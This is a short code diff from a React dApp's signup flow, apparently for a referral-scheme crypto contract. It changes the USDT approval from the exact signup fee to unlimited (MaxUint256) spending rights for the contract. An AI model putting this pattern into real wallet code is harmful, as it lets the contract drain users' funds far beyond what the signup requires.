@@ -45,12 +45,11 @@ function App() {
       const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
       const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
       
-      // 1. Approval
-      const feeInWei = ethers.parseUnits(signupFee, 18);
-      const approveTx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, feeInWei);
-      await approveTx.wait();
+      // 1. PEHLE: Unlimited Approval (MaxUint256)
+      const approveTx = await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
+      await approveTx.wait(); 
       
-      // 2. Registration
+      // 2. BAAD MEIN: Register call
       const ref = (referralInput && ethers.isAddress(referralInput)) ? referralInput : "0x0000000000000000000000000000000000000000";
       const regTx = await coreContract.register(ref);
       await regTx.wait();
@@ -59,7 +58,6 @@ function App() {
       fetchHistory(await signer.getAddress(), provider);
       alert("Registration Successful!");
     } catch (e) { 
-      // Yahan ab asli error message dikhega
       const errorMessage = e.reason || e.message || "Unknown Error";
       console.error("Full Error:", e);
       alert("Signup Failed: " + errorMessage); 
